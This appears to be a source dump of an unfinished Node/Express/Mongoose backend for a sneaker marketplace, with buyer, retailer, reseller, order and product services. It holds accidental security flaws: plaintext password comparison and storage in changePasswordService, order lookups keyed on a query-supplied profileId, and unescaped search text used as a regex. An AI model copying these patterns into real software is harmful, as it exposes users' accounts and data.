    "@types/multer-s3": "^3.0.3",
    "@types/node": "^24.10.1",
    "@types/nodemailer": "^7.0.3",
    "@types/socket.io": "^3.0.1",
    "@typescript-eslint/eslint-plugin": "^8.46.4",
    "@typescript-eslint/parser": "^8.46.4",
    "eslint": "^9.39.1",
    "eslint-config-prettier": "^10.1.8",
    "eslint-plugin-prettier": "^5.5.4",
    "prettier": "^3.6.2",
    "ts-node": "^10.9.2",
    "typescript": "^5.9.3"
  },
  "dependencies": {
    "@aws-sdk/client-s3": "^3.893.0",
    "bcrypt": "^6.0.0",
    "cookie-parser": "^1.4.7",
    "cors": "^2.8.5",
    "dotenv": "^17.2.3",
    "express": "^5.1.0",
    "jsonwebtoken": "^9.0.2",
    "mongoose": "^8.19.4",
    "multer": "^2.0.2",
    "multer-s3": "^3.0.1",
    "node-cron": "^4.2.1",
    "node-fetch": "^3.3.2",
    "nodemailer": "^7.0.10",
    "nodemon": "^3.1.14",
    "openai": "^6.33.0",
    "socket.io": "^4.8.3",
    "stripe": "^20.1.0",
    "winston": "^3.18.3",
    "winston-daily-rotate-file": "^5.0.0",
    "zod": "^4.1.12"
  }
}
```

## File: src/app/module/Product/Product.interface.ts
```typescript
import { Types } from "mongoose";

export interface IProduct {
    retailerId: Types.ObjectId;
    type: string;
    name: string;
    description: string;
    price: number;
    images: string[];
    brand: string;
    // color?: string;
    styleCode?: string;
    // variant?: {
    //     size: string,
    //     stock: number
    // }[];
    sneakerAttributes?: {};
    tshirtAttributes?: {};
    availability: string;
    totalSearchCount: number;
    createdAt: Date;
}

export interface IProductVariant {
    retailerId: Types.ObjectId;
    productId: Types.ObjectId;
    size: string;
    color: string;
    sku: string;
    price: number;
    stock: number;
    reservedStock: number;
    isActive: boolean;
    createdAt: Date;
}

export type TProductType = "SNEAKER" | "TSHIRT";

export type TGender = "MEN" | "WOMEN" | "UNISEX" | "KIDS";

export type TSneakerAttributes = {
  modelName: string;
  releaseYear?: number;
  colorway?: string;
  condition?: "NEW" | "USED" | "DEADSTOCK";
  upperMaterial?: string;
  soleMaterial?: string;
  closureType?: string;
};

export type TTshirtAttributes = {
  fit?: "REGULAR" | "SLIM" | "OVERSIZED" | "RELAXED";
  fabric?: string;
  neckType?: "CREW_NECK" | "V_NECK" | "POLO" | "ROUND_NECK";
  sleeveType?: "SHORT_SLEEVE" | "LONG_SLEEVE" | "SLEEVELESS";
  gsm?: number;
};

export type TProductVariantPayload = {
  size: string;
  color: string;
  sku: string;
  price: number;
  stock: number;
};

export type TAddProductPayload = {
  retailerId: string;
  productType: TProductType;
  name: string;
  brand: string;
  description: string;
  // images: string[];
  basePrice: number;
  availability: string;
  styleCode: string;
  sneakerAttributes?: TSneakerAttributes;
  tshirtAttributes?: TTshirtAttributes;
  variants: TProductVariantPayload[];
};

export interface IRecentSearch extends Document {
  buyerId: string;
  keyword: string;
  searchedAt: Date;
}
```

## File: src/app/module/Retailer/Retailer.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IRetailer } from "./Retailer.interface";


const defaultOperationHours = () => [
    { day: "Sunday", openTime: "9:00 AM", closeTime: "10:00 PM", isOpen: true },
    { day: "Monday", openTime: "9:00 AM", closeTime: "10:00 PM", isOpen: true },
    { day: "Tuesday", openTime: "9:00 AM", closeTime: "10:00 PM", isOpen: true },
    { day: "Wednesday", openTime: "9:00 AM", closeTime: "10:00 PM", isOpen: true },
    { day: "Thursday", openTime: "9:00 AM", closeTime: "10:00 PM", isOpen: true },
    { day: "Friday", openTime: "9:00 AM", closeTime: "10:00 PM", isOpen: true },
    { day: "Saturday", openTime: "9:00 AM", closeTime: "10:00 PM", isOpen: true },
];


const RetailerSchema = new Schema<IRetailer>({
    auth: { type: Schema.Types.ObjectId, required: true, ref: "Auth" },
    parentStore: { type: Schema.Types.ObjectId, ref: "Retailer", default: null },
    badge: { type: String, default: "" },
    name: { type: String, required: true },
    email: { type: String, required: true, unique: true },
    coverImage: { type: String, default: "" },
    image: { type: String, default: "" },
    // shoeSize: { type: Number, default: 0 },
    type: { type: String, default: "" },
    details: { type: String, default: "" },
    location: {
        type: {
            type: String,
            enum: ["Point"],
            default: "Point",
        },
        coordinates: {
            type: [Number],
            default: [0, 0],
        },
    },
    address: { type: String, default:"" },
    phone: { type: String, default:"" },
    website: { type: String, default:"" },
    operationHour: {
        type: [{
            day: {
                type: String,
                enum: ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],
                required: true
            },
            openTime: { type: String, default: "9:00 AM" },
            closeTime: { type: String, default: "10:00 PM" },
            isOpen: { type: Boolean, default: true }
        }],
        default: defaultOperationHours
    },
    socialLink:{type:Object,default:{}},
    subscription:{type:Schema.Types.ObjectId,ref:"Subscription"},
    subscriptionStartDate:{type:Date},
    subscriptionEndDate:{type:Date},
    followersCount:{type:Number,default:0},
    averageRating:{type:Number,default:0},
    isApproved:{type:Boolean,default:false},
}, { timestamps: true });

//to enable geospatial queries efficiently
RetailerSchema.index({ location: "2dsphere" });

const RetailerModel = models.Retailer || model<IRetailer>("Retailer", RetailerSchema);

export default RetailerModel;
```

## File: src/app/module/User/User.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import { Express } from "express";
import {  IChangePassword, IUser, TaddDate } from "./User.interface";
import UserModel from "./User.model";
import { JwtPayload } from "jsonwebtoken";
import deleteOldFile from "../../../utilities/deleteFile";
import { IJwtPayload } from "../../../interface/jwt.interface";
import { email } from "zod";
import AuthModel from "../auth/auth.model";
import BuyerModel from "../Buyer/Buyer.model";
import { IBuyer } from "../Buyer/Buyer.interface";



const updateUserProfile = async (
    userDetails: IJwtPayload,
    file: Express.Multer.File | undefined,
    payload: any
) => {
  const { profileId } = userDetails;

  // Fetch user and profile in parallel
  const user = await BuyerModel.findById(profileId);
   

  if (!user ) {
    throw new ApiError(404, "Profile not found to update.");
  }


  // Handle image update
  if (file) {

    if (user.image) deleteOldFile(user.image as string);

    // user.image = `uploads/profile-image/${file.filename}`;

    payload.image = `uploads/profile-image/${file.filename}`;

    // await user.save();

  }

  // Save both

  const updatedUser = await BuyerModel.findByIdAndUpdate(
    profileId,
    ...payload
  );

  return updatedUser;
};

const getMyProfile = async (userDetails: JwtPayload) => {

    const {profileId} = userDetails;
    
    const user = await UserModel.findById(profileId);

    if(!user){
        throw new ApiError(404,"failed to get profile detail.");
    }

    return user;
    
}


const changePasswordService = async (userDetails: IJwtPayload, payload: IChangePassword) => {
    // Service logic goes here
    const { authId } = userDetails;
    const { currentPassword, newPassword } = payload;

    const user =  await UserModel.findById(authId).select('+password');
    if(!user){
        throw new ApiError(404,'User not found to change password.');
    }

    // const isPasswordMatched = await user.isPasswordMatched(oldPassword);
    // if(!isPasswordMatched){
    //     throw new ApiError(400,'Old password is incorrect');
    // }
    if(user.password !== currentPassword){
        throw new ApiError(400,'Current password is incorrect.');
    }

    user.password = newPassword;
    await user.save();

    return null;
}



//dashboard

const getAllUserService = async (query: Record<string,unknown>) => {

    let {page, searchText} = query;

    //if searchText is true
    if(searchText){
        const users = await BuyerModel.find({
             $or: [
                    { name: { $regex: searchText, $options: "i" } },
                    { email: { $regex: searchText, $options: "i" } },
                ]
        }) .populate({path: "auth", select:"isBlocked"}).lean();

        return users;

    }

    //pagination
    page = parseInt(page as any) || 1;
    let limit = 10;
    let skip = (page as number - 1) * limit;


    const [users, totalUser] = await Promise.all([

        BuyerModel.find({})
            .populate({path: "auth", select:"isBlocked"})
                .select("name image email createdAt")
                .sort({createdAt: -1})
                    .skip(skip).limit(limit)
                        .lean(),
    
        BuyerModel.countDocuments({})
    ])

    const totalPage = Math.ceil(totalUser / limit);

    return {
        meta:{page,limit: 10,total: totalUser, totalPage},
        users
    };
}

const blockUserService = async (id: string) => {
    
    // if(!authId){
    //     throw new ApiError(400,"User id is required to block a user");
    // }

    const auth = await AuthModel.findById(id);

    if(!auth){
        throw new ApiError(404,"User not found to block.");
    }

    auth.isBlocked = !auth.isBlocked;

    let msg = auth.isBlocked ? "User has been blocked." : "User has been unblocked.";

    await auth.save();

    return {
        user: { name: auth.name, email: auth.email, isBlocked: auth.isBlocked },
        msg
    };
}

const UserServices = {
    updateUserProfile, 
    getMyProfile,
    changePasswordService ,
    getAllUserService,
    blockUserService
};
export default UserServices;
```

## File: src/app/module/Buyer/Buyer.service.ts
```typescript
import mongoose, { mongo } from "mongoose";
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import deleteOldFile from "../../../utilities/deleteFile";
import { ENUM_PRODUCT_AVAILABILITY } from "../../../utilities/enum";
import { FollowModel, WishListModel } from "../Engagement/Engagement.model";
import RetailerModel from "../Retailer/Retailer.model";
import { IBuyer, IBuyerNotification } from "./Buyer.interface";
import BuyerModel from "./Buyer.model";
import { ProductModel } from "../Product/Product.model";

const setBuyerNotificationAlerts = async (userDetails: IJwtPayload, payload: IBuyerNotification) => {

    const { profileId } = userDetails;

    const buyer:any = await BuyerModel.findById(profileId);

    if (!buyer) {
        throw new ApiError(404, "Buyer not found");
    }

    buyer.notification = {
        ...payload
    };

    await buyer.save();

    return buyer?.notification;
};

const addSelectedShoeSize = async (userDetails: IJwtPayload, payload: { label: string; size: number }[]) => {

    const { profileId } = userDetails;

    if (!payload.length) {
        throw new ApiError(400, "At least one shoe size is required.");
    }

    const buyer:any = await BuyerModel.findById(profileId);

    if (!buyer) {
        throw new ApiError(404, "Buyer not found");
    }

    buyer.shoeSize = payload[0]?.size;
    buyer.selectedShoeSize.push(...payload);

    await buyer.save();

    return buyer?.selectedShoeSize;
}

const addBrandsOfInterest = async (userDetails: IJwtPayload, payload: string[]) => {

    const { profileId } = userDetails;

    const buyer:any = await BuyerModel.findById(profileId);

    if (!buyer) {
        throw new ApiError(404, "Buyer not found");
    }

    buyer.brands.push(...payload);

    await buyer.save();

    return buyer?.brands;
}

const getBuyersInterestsData = async (userDetails: IJwtPayload) => {
    const { profileId } = userDetails;

    let [brands, stores, favourites] = await Promise.all([
        BuyerModel.findById(profileId).select("name shoeSize brands"),
        FollowModel.find({ buyerId: profileId }).populate("retailerId", "name").lean(),
        WishListModel.find({ buyerId: profileId }).populate("productId", "name").lean()
    ]);

    // BuyerModel.findById(profileId).select("name shoeSize brands").lean();

    // const stores = await FollowModel.find({ buyerId: profileId }).populate("retailerId", "name").lean();

    // const favourites = await WishListModel.find({ buyerId: profileId }).populate("productId", "name").lean();

    return {
        brands: brands?.brands || [],
        stores: stores || [],
        favourites: favourites || []
    };
}

const updateBuyerProfileService = async (
    userDetails: IJwtPayload,
    file: Express.Multer.File | undefined,
    payload: any
    ) => {

    const { profileId } = userDetails;
    
    let {name,bio,shoeSize,selectedShoeSize,brands,privacy,address,latitude,longitude} = payload;

    // let lat,long;

    // if(latitude && longitude){
    //     lat = Number(latitude);
    //     long = Number(longitude);
    // }
    
    const profile:any = await BuyerModel.findById(profileId).lean();
    if (!profile) {
        throw new ApiError(404, "Buyer not found to update.");
    }

    let buyerProfileImage = "";

    if(file){
        buyerProfileImage = `uploads/profile-image/${file.filename}`;

        deleteOldFile(profile?.image);
    }

    const updateData: any = {
        name,
        bio,
        shoeSize,
        selectedShoeSize,
        brands,
        address,
        privacy,
    };

    if (buyerProfileImage) {
        updateData.image = buyerProfileImage;
    }

    if (latitude != null && longitude != null) {
        updateData["location.coordinates"] = [
            Number(longitude),
            Number(latitude),
        ];
    }

    const updatedProfile = await BuyerModel.findByIdAndUpdate(
        profileId,
        {
            $set: updateData,
        },
        {
            new: true,
        }
    );

    

    return updatedProfile;
};



//buyer home page api

const getNearbyProductsForBuyer = async (userDetails: IJwtPayload, query: Record<string,unknown>) => {
    const { productType = 'all' , latitude, longitude } = query; //productType = all,Sneakers,Clothing

    // const { productType = "all", latitude, longitude } = query;

    const maxDistance = 50000; // 50 KM

    const matchStage: any = {
        availability: { $in: [ENUM_PRODUCT_AVAILABILITY.ACTIVE, ENUM_PRODUCT_AVAILABILITY.LOW_STOCK] },
    };

    if (productType !== "all") {
        matchStage.type = productType;
    }

    const products = await RetailerModel.aggregate([
        {
            $geoNear: {
                near: {
                    type: "Point",
                    coordinates: [
                        Number(longitude),
                        Number(latitude),
                    ],
                },
                distanceField: "distance",
                maxDistance,
                spherical: true,
                query: {
                    isApproved: true,
                },
            },
        },

        {
            $lookup: {
                from: "products",
                localField: "_id",
                foreignField: "retailerId",
                as: "products",
                pipeline: [
                    {
                        $match: matchStage,
                    },
                ],
            },
        },

        {
            $unwind: "$products",
        },

        {
            $project: {
                _id: "$products._id",
                retailerId: "$_id",
                retailerName: "$name",
                retailerImage: "$image",
                distance: 1,

                name: "$products.name",
                price: "$products.price",
                images: "$products.images",
                type: "$products.type",
                brand: "$products.brand",
                availability: "$products.availability",
                createdAt: "$products.createdAt",
            },
        },

        {
            $sort: {
                createdAt: - 1,
            },
        },
        {
            $limit: 10
        }
    ]);

    const trendingProduct = await ProductModel.find({}).sort({totalSearchCount: -1}).lean();

    const mostWishlistedProducts = await WishListModel.aggregate([
        {
            $match: {
                isWanted: false,
            },
        },

        {
            $group: {
            _id: "$productId",
            wishlistCount: {
                $sum: 1,
            },
            },
        },

        {
            $sort: {
            wishlistCount: -1,
            },
        },

        {
            $lookup: {
            from: "products",
            localField: "_id",
            foreignField: "_id",
            as: "product",
            },
        },

        {
            $unwind: "$product",
        },

        {
            $project: {
            _id: "$product._id",
            name: "$product.name",
            brand: "$product.brand",
            price: "$product.price",
            images: "$product.images",
            wishlistCount: 1,
            },
        },
    ]);


    return products;

}

const getBuyersStoreBrandWishlistdataService = async (userDetails: IJwtPayload) => {
    const { profileId } = userDetails;

    const profileObjectId = new mongoose.Types.ObjectId(profileId);

    const pipeline1 = [];
    const pipeline2 = [];

    const [brands, stores, wishlist] = await Promise.all([
        BuyerModel.findById(profileId).select("brands").lean(),

        FollowModel.find({ buyerId: profileId }).populate("retailerId", "name").lean(),

        WishListModel.find({ buyerId: profileId }).populate("productId", "name").lean()
    ]);

    return {
        brands: brands || [],
        stores: stores || [],
        wishlist: wishlist || []
    };
}

const getBuyerFollowedBrandsProducts = async (userDetails: IJwtPayload) => {
    const { profileId } = userDetails;

    // const profileObjectId = new mongoose.Types.ObjectId(profileId);

    const buyer:any = await BuyerModel.findById(profileId).select("brands").lean();

    const products = await ProductModel.find({
        brand: {
            $in: buyer?.brands,
        },
        })
        .sort({ createdAt: -1 })
        .limit(5)
        .lean();

    // const [brands, stores, wishlist] = await Promise.all([
    //     BuyerModel.findById(profileId).select("brands").lean(),

    //     FollowModel.find({ buyerId: profileId }).populate("retailerId", "name").lean(),

    //     WishListModel.find({ buyerId: profileId }).populate("productId", "name").lean()
    // ]);

    return {
        followedBrandProduct: products,
        // brands: brands || [],
        // stores: stores || [],
        // wishlist: wishlist || []
    };

    
}

const getBuyerFollowedRetailersProducts = async (userDetails: IJwtPayload) => {
    const { profileId } = userDetails;

    // const profileObjectId = new mongoose.Types.ObjectId(profileId);

    const followedRetailers = await FollowModel.find({
            buyerId: profileId,
        })
        .select("retailerId")
        .lean();

    const retailerIds = followedRetailers.map(
        (item) => item.retailerId
        );

    const products = await ProductModel.find({
        retailerId: {
            $in: retailerIds,
        },
        availability: ENUM_PRODUCT_AVAILABILITY.ACTIVE,
        })
        .sort({ createdAt: -1 })
        .limit(5)
        .lean();

    // const [brands, stores, wishlist] = await Promise.all([
    //     BuyerModel.findById(profileId).select("brands").lean(),

    //     FollowModel.find({ buyerId: profileId }).populate("retailerId", "name").lean(),

    //     WishListModel.find({ buyerId: profileId }).populate("productId", "name").lean()
    // ]);

    return {
        followedRetailerProduct: products,
        // brands: brands || [],
        // stores: stores || [],
        // wishlist: wishlist || []
    };

    
}

const BuyerServices = { 
    setBuyerNotificationAlerts,
    addSelectedShoeSize,
    addBrandsOfInterest,
    getBuyersInterestsData,
    updateBuyerProfileService,

    getNearbyProductsForBuyer,
    getBuyersStoreBrandWishlistdataService,
    getBuyerFollowedBrandsProducts,
    getBuyerFollowedRetailersProducts
};

export default BuyerServices;
```

## File: src/app/module/Order/Order.service.ts
```typescript
import { stat } from "fs";
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import { IOrder, TOrderPayload } from "./Order.interface";
import {OrderItemModel, OrderModel, SellerSplitOrderModel} from "./Order.model";
import { ENUM_NOTIFICATION_TYPE, ENUM_ORDER_STATUS, ENUM_ORDER_TYPE } from "../../../utilities/enum";
import mongoose from "mongoose";
import {ProductModel} from "../Product/Product.model";
import { PaymentModel } from "../Payment/Payment.model";
import { completeOrderAfterPayment } from "../Payment/PaymentSuccess.service";
import notification from "../../../helper/notification";

const placeNewOrderService = async (userDetails:IJwtPayload,payload: TOrderPayload) => {

    const { profileId } = userDetails;

    const { retailerId, productId,orderType, selectedSize, quantity, unitPrice, pickupTime } = payload;

    //  3. create order and orderItem collection

    
    const newOrder = await OrderModel.create({
        buyerId: profileId,
        retailerId,
        status: orderType === ENUM_ORDER_TYPE.HOLD ? ENUM_ORDER_STATUS.HOLDING : ENUM_ORDER_STATUS.PLACED,
        type: orderType,
        productId,
        selectedSize,
        quantity,
        unitPrice,
        totalPrice: unitPrice * quantity,
        pickupTime
    });
    
    if(!newOrder){
        throw new ApiError(500, "Failed to place the order.");
    }

    // 4. make payment and create payment schema collection

    // 5. Webhook confirm payment
    
    // 5. Adjust inventory

    return null;

};

// buy-now.service.ts

interface BuyNowPayload {

    buyerId: string;

    productId: string;

    retailerId: string;

    selectedSize: number;

    quantity: number;

    paymentMethod:
        | "STRIPE"
        | "SSL_COMMERZ"
        | "BKASH"
        | "COD";

    shippingAddress: {
        name: string;
        phone: string;
        address: string;
        city: string;
        area?: string;
    };
}

const buyNowService = async (
    payload: BuyNowPayload
) => {

    const session = await mongoose.startSession();

    try {

        session.startTransaction();

        // =====================================================
        // 1. GET PRODUCT
        // =====================================================

        const product: any =
            await ProductModel.findById(
                payload.productId
            ).session(session);

        if (!product) {
            throw new Error("Product not found");
        }

        // =====================================================
        // 2. VALIDATE SIZE
        // =====================================================

        const sizeVariant = product.sizes.find(
            (s: any) =>
                s.size === payload.selectedSize
        );

        if (!sizeVariant) {
            throw new Error("Selected size unavailable");
        }

        // =====================================================
        // 3. VALIDATE STOCK
        // =====================================================

        if (
            sizeVariant.stock < payload.quantity
        ) {
            throw new Error("Insufficient stock");
        }

        // =====================================================
        // 4. CALCULATE PRICE
        // =====================================================

        const unitPrice = product.price;

        const subtotal = unitPrice * payload.quantity;

        const shippingCharge = 100;

        const discountAmount = 0;

        const totalAmount = subtotal + shippingCharge - discountAmount;

        // =====================================================
        // 5. CREATE ORDER
        // =====================================================

        const order = await OrderModel.create([{

            buyerId: payload.buyerId,

            orderNumber: `ORD-${Date.now()}`,

            subtotal,

            shippingCharge,

            discountAmount,

            totalAmount,

            totalItems: payload.quantity,

            paymentStatus: "PENDING",

            orderStatus: "PLACED",

            paymentMethod:
                payload.paymentMethod,

            shippingAddress:
                payload.shippingAddress,

        }], { session });

        const createdOrder = order[0];

        // =====================================================
        // 6. CREATE ORDER ITEM
        // =====================================================

        await OrderItemModel.create([{

            orderId: createdOrder._id,

            buyerId: payload.buyerId,

            retailerId: payload.retailerId,

            productId: payload.productId,

            productSnapshot: {
                name: product.name,
                image: product.image,
                brand: product.brand,
            },

            selectedSize:
                payload.selectedSize,

            quantity: payload.quantity,

            unitPrice,

            totalPrice: subtotal,

            status: "PLACED",

        }], { session });

        // =====================================================
        // 7. CREATE SELLER SPLIT ORDER
        // =====================================================

        await SellerSplitOrderModel.create([{

            orderId: createdOrder._id,

            retailerId: payload.retailerId,

            buyerId: payload.buyerId,

            totalItems: payload.quantity,

            totalAmount: subtotal,

            status: "PLACED",

        }], { session });

        // =====================================================
        // 8. CREATE PAYMENT
        // =====================================================

        const payment = await PaymentModel.create([{

            orderId: createdOrder._id,

            buyerId: payload.buyerId,

            amount: totalAmount,

            gateway: payload.paymentMethod,

            transactionId:
                `TXN-${Date.now()}`,

            status:
                payload.paymentMethod === "COD"
                    ? "SUCCESS"
                    : "PENDING",

        }], { session });

        // =====================================================
        // 9. COD DIRECT COMPLETE
        // =====================================================

        if (
            payload.paymentMethod === "COD"
        ) {

            await completeOrderAfterPayment({
                orderId:
                    createdOrder._id.toString(),

                transactionId:
                    payment[0].transactionId,

                session,
            });
        }

        await session.commitTransaction();

        return {

            success: true,

            message:
                "Buy now checkout successful",

            data: {

                order: createdOrder,

                payment: payment[0],
            }
        };

    } catch (error: any) {

        await session.abortTransaction();

        throw new Error(error.message);

    } finally {

        session.endSession();
    }
};

//get buyer all order
const getBuyerAllOrder = async (userDetails: IJwtPayload, query: Record<string,unknown>) => {

    const {profileId} = query;

    const {orderStatus} = query;

    const allOrder = await OrderItemModel.find({
        buyerId: profileId,
        status: orderStatus
    }).lean();

    return allOrder;

}


//retailer

//home page

const getRetailerHomePageOrderStatDataService = async (userDetails: IJwtPayload) => {

    const allOrder = await OrderModel.countDocuments({
        orderStatus: {
            $in: [

            ENUM_ORDER_STATUS.ACCEPTED,
            // ENUM_ORDER_STATUS.,
            // ENUM_ORDER_STATUS.ACCEPTED,
            ] 
        }
    });

    const readyOrder = await OrderModel.countDocuments({
        orderStatus: {
            $in: [

            ENUM_ORDER_STATUS.COMPLETED,
            // ENUM_ORDER_STATUS.,
            // ENUM_ORDER_STATUS.ACCEPTED,
            ] 
        }
    });

    let revenue = 0 ;

    let runningLowPairCount = 0;

    return {
        allOrder,
        readyOrder,
        revenue,
        runningLowPairCount
    }

}

//order page

const retailerAcceptOrderService = async (userDetails: IJwtPayload, orderId: string) => {
    const {profileId} = userDetails;

    // const {orderId,orderStatus} = query;

    const order = await OrderItemModel.findById(orderId);

    if( order.retailerId.toString() !== profileId){
        throw new ApiError(403,"You can not accept this order.");
    }

    order.status = ENUM_ORDER_STATUS.ACCEPTED;

    await order.save();

    //adjust inventory

    //send notification
    await notification.createNotification({
        toId: order?.buyerId,
        toModel: "Buyer",
        title: "Store keeper accepted your order.",
        description: `Store keeper accepted your order. View the order to check current status.`,
        // message?: string;
        type: ENUM_NOTIFICATION_TYPE.ORDER_ACCEPTED,
        referenceId: order._id,
        referenceModel: "Order",
        metadata: {}
    });
}

const getOrderDetailsById = async (orderId: string) => {
    // const {profileId} = userDetails;

    const order = await OrderItemModel.findById(orderId).lean();

    if(!order){
        throw new ApiError(404,"Failed to get order details.");
    }

    return order;
}


const OrderServices = { 
    placeNewOrderService,
    getRetailerHomePageOrderStatDataService,
    retailerAcceptOrderService,
    getOrderDetailsById,
 };

export default OrderServices;
```

## File: src/app/module/Reseller/Reseller.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import notification from "../../../helper/notification";
import { IJwtPayload } from "../../../interface/jwt.interface";
import deleteOldFile from "../../../utilities/deleteFile";
import { ENUM_NOTIFICATION_TYPE, ENUM_PAIR_REQUEST_STATUS, ENUM_USER_Type } from "../../../utilities/enum";
import { IPairRequest } from "../Pairs/Pairs.interface";
import { PairRequestModel, PairsModel } from "../Pairs/Pairs.model";
import { IReseller } from "./Reseller.interface";
import ResellerModel from "./Reseller.model";

const resellerHomePageStatDataService = async (userDetails: IJwtPayload) => {
    const {profileId} = userDetails;

    const activeListingsCount = await PairsModel.countDocuments({resellerId: profileId});
    // const totalListingsCount = await PairsModel.countDocuments({resellerId: profileId});

    const totalStoreRequestsCount = await PairRequestModel.countDocuments({
        resellerId: profileId,
        status: {$in: [ENUM_PAIR_REQUEST_STATUS.PENDING, ENUM_PAIR_REQUEST_STATUS.ACCEPTED]}
    });

    const totalActiveRequestsCount = await PairRequestModel.countDocuments({
        resellerId: profileId,
        status: ENUM_PAIR_REQUEST_STATUS.ACCEPTED
    });

    return { 
        activeListingsCount, 
        // totalListingsCount 
    };
};

//make an offer request to reseller's pair request
const makeRequestForPairService = async (userDetails: IJwtPayload, payload: any) => {
    const {profileId} = userDetails;

    const {pairId, quantity, variant, askingPrice,offerPrice, validityHours, note, dealCompletionType} = payload;

    const pair: any = await PairsModel.findById(pairId).lean();

    if (!pair) {
        throw new ApiError(404, "Pairs not found.");
    }

    if (pair.resellerId.toString() === profileId) {
        throw new ApiError(400, "You cannot make a request for your own pairs.");
    }

    if (pair.quantity < quantity) {
        throw new ApiError(400, "Requested quantity exceeds available quantity.");
    }

    const newPairRequest = new PairRequestModel({
        resellerId: pair?.resellerId,
        retailerId: profileId,
        pairId,
        quantity,
        variant,
        askingPrice: pair?.askingPrice,
        offerHistory: [
            {
                offeredBy: ENUM_USER_Type.RETAILER,
                price: offerPrice,
                // note: note || ""
            }
        ],
        status: ENUM_PAIR_REQUEST_STATUS.PENDING,
        note,
        validity: {
            validForHours: validityHours,
            from: new Date(),
            to: new Date(Date.now() + validityHours * 60 * 60 * 1000)
        },
        // dealCompletionType
    });

    await newPairRequest.save();

    //send notification to the reseller about the new pair request (this can be implemented using a notification service or system)

    return newPairRequest;

};

//retailer profile
const updateResellerProfileService = async (
    userDetails: IJwtPayload,
    file: Express.Multer.File | undefined,
    payload: any
    ) => {

    const { profileId } = userDetails;
    
    let {name,bio,phone,website,address,latitude,longitude} = payload;

    // console.log("profileImage, coverImage", profileImage, coverImage);
    
    const profile:any = await ResellerModel.findById(profileId).lean();
    if (!profile) {
        throw new ApiError(404, "Buyer not found to update.");
    }

    
    const updateData: any = {
        name,
        bio,
        phone,
        website,
        address,
    };
    
    if(file){
        updateData.image = `uploads/profile-image/${file.filename}`;

        deleteOldFile(profile?.image);
    }

    // if(coverImage){
    //     updateData.coverImage = `uploads/cover-image/${profileImage}`;

    //     deleteOldFile(profile?.coverImage);
    // }

    if (latitude != null && longitude != null) {
        updateData["location.coordinates"] = [Number(longitude),Number(latitude)];
    }

    const updatedProfile = await ResellerModel.findByIdAndUpdate(
        profileId,
        {
            $set: updateData,
        },
        {
            new: true,
        }
    );

    

    return updatedProfile;
};

//dashboard

const getAllResellerService = async (query: Record<string,unknown>) => {

    let {page, searchText} = query;

    //if searchText is true
    if(searchText){
        const users = await ResellerModel.find({
             $or: [
                    { name: { $regex: searchText, $options: "i" } },
                    { email: { $regex: searchText, $options: "i" } },
                ]
        }) .populate({path: "auth", select:"isBlocked"}).lean();

        return users;

    }

    //pagination
    page = parseInt(page as any) || 1;
    let limit = 10;
    let skip = (page as number - 1) * limit;


    const [users, totalUser] = await Promise.all([

        ResellerModel.find({})
            .populate({path: "auth", select:"isBlocked"})
                .sort({createdAt: -1})
                    .skip(skip).limit(limit)
                        .lean(),
    
        ResellerModel.countDocuments({})
    ])

    const totalPage = Math.ceil(totalUser / limit);

    return {
        meta:{page,limit: 10,total: totalUser, totalPage},
        reseller: users
    };
}

const approveResellerService = async (id: string) => {

    const approvedReseller = await ResellerModel.findById(id).select("name isApproved");

    if(!approvedReseller){
        throw new ApiError(404,"Reseller not found.");
    }

    approvedReseller.isApproved = true;
    await approvedReseller.save();

    let msg = approvedReseller.isApproved ? "approved" : "disapproved";

    //send notification to reseller about approval (implementation pending)
    // await notification.createNotification({
    //     toId: id,
    //     toModel: "Reseller",
    //     title: "Account Approved",
    //     description: `Congratulations! Your reseller account has been approved. You can now start listing your pairs and receiving offers from retailers.`,
    //     type: ENUM_NOTIFICATION_TYPE.ACCOUNT_APPROVAL,
    //     referenceId: id,
    //     referenceModel: "Reseller"
    // });

    return msg;
    
}

const ResellerServices = { 
    resellerHomePageStatDataService,
    makeRequestForPairService,
    updateResellerProfileService,
};


export default ResellerServices;
```

## File: src/app/module/Retailer/Retailer.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import RetailerValidations from "./Retailer.validation";
import RetailerController from "./Retailer.controller";
import { uploadProfile } from "../../middlewares/multerMiddleware";


const RetailerRouter = express.Router();


RetailerRouter.get(
    "/get-nearby-retailers",
    validateRequest(RetailerValidations.validateLatLongTofilterNearbyRetailers),
    RetailerController.filterNearbyRetailersController
);

//buyer map page

RetailerRouter.get(
    "/get-nearby-retailer-map",
    validateRequest(RetailerValidations.validateLatLongTofilterNearbyRetailers),
    RetailerController.getAllNearbyRetailerForMap
);

//retailer inventory

RetailerRouter.get(
    "/get-retailer-inventory",
    authorizeUser,
    RetailerController.getRetailerInventoryController
);

//retailer order

RetailerRouter.get(
    "/get-retailer-order",
    authorizeUser,
    RetailerController.getRetailerAllOrdersController
);

RetailerRouter.post(
    "/toggle-retailer-operation-hour",
    authorizeUser,
    RetailerController.toggleRetailerOperationHourController
);

RetailerRouter.patch(
    "/update-retailer-profile",

    authorizeUser,

    uploadProfile.fields([
        {
            name: "profile-image",
            maxCount: 1,
        },
        {
            name: "cover-image",
            maxCount: 1,
        },
    ]),

    // validateRequest(RetailerValidations.addNewBranchValidationSchema),

    RetailerController.updateRetailerProfile
),

RetailerRouter.post(
    "/add-verification-info",

    authorizeUser,

    uploadProfile.fields([
        {
            name: "retailer-file",
            maxCount: 1,
        },
        {
            name: "cover-image",
            maxCount: 1,
        },
    ]),

    validateRequest(RetailerValidations.addVerificationInfoValidationSchema),

    RetailerController.addVerificationInfo
),


//branch


RetailerRouter.post(
    "/add-new-branch",

    authorizeUser,

    uploadProfile.fields([
        {
            name: "profile-image",
            maxCount: 1,
        },
        {
            name: "cover-image",
            maxCount: 1,
        },
    ]),

    validateRequest(RetailerValidations.addNewBranchValidationSchema),

    RetailerController.addNewBranchController
),

RetailerRouter.get(
    "/get-all-branch",
    authorizeUser,
    RetailerController.getAllBranchController
);




export default RetailerRouter;
```

## File: src/app/routes/index.ts
```typescript
import { Router } from "express";
import authRouter from "../module/auth/auth.routes";
import userRouter from "../module/User/User.routes";
import BuyerRouter from "../module/Buyer/Buyer.routes";
import RetailerRouter from "../module/Retailer/Retailer.routes";
